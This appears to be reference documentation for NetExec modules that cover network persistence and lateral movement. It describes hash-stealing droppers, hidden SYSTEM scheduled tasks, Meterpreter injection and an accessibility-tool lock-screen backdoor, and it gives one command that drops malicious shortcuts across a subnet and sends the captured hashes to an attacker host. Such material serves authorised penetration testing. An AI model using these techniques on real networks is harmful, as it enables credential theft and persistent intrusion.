# Persistence & Lateral Movement

These modules are designed to establish autonomous execution or permanent backdoors on the network, either through direct code execution or sneaky malicious drop files.

## Malicious Droppers

If you only have limited write privileges to a network share (but no execution rights), dropping these physical files can yield hashes or shells from users who browse the share.

*   **`slinky`**: Drops malicious `.lnk` shortcut files. When any user opens the share, their `explorer.exe` tries to load the shortcut icon, automatically transmitting their NTLMv2 hash back to your C2 / Responder instance.
    ```bash
    nxc smb 10.10.10.0/24 -M slinky --lhost 10.0.0.50
    ```
*   **`scuffy`**: Drops `.scf` explorer shell extensions functioning exactly like Slinky.
*   **`drop_sc`**: Drops `.searchConnector-ms` files for hash hijacking.
*   **`drop_library_ms`**: Drops `.library-ms` files for explorer hijacking.

## Backdoors & Execution

*   **`schtask_as`**: Creates a malicious hidden Windows Scheduled Task configured to run unconditionally as `NT AUTHORITY\SYSTEM` or another predefined user.
*   **`web_delivery`**: Hosts a local payload and sends a highly obfuscated download cradle to the target memory via SMB execution.
*   **`empire_exec`**: Deep integration with PowerShell Empire framework to fire off stagers effortlessly.
*   **`met_inject`**: Dynamically maps remote process memory over MSRPC and injects Meterpreter shellcode without dropping any executable files to disk.
*   **`lockscreendoors`**: Alters the system configuration to launch `cmd.exe` running as SYSTEM if `Utilman.exe` (Ease of Access) or StickyKeys is invoked from the RDP Lock Screen.
